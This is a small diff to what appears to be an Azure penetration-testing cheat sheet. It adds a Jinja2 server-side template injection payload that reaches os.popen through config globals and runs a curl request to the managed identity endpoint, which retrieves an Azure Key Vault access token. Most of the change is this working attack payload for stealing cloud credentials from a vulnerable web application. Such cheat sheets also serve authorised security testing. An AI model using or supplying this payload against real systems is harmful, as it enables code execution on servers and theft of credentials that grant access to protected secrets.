@@ -226,6 +226,8 @@ az account get-access-token --resource-type ms-graph
 #### Get keyvault access token
 ```
 curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```
+```
 {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
 ```
 
